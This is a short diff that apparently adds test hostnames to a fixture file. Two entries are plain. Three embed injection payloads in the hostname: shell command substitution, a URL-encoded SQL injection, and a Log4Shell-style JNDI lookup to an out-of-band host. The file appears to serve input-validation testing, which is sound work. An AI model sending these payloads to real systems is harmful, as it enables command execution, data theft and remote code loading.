@@ -1,0 +1,5 @@
+api.prod.example.invalid
+login.usw2.example.invalid
+example.com.$(id).invalid
+example.com.%27%20or%201%3D1--.invalid
+example.com.${jndi:ldap://oast.invalid/a}.invalid
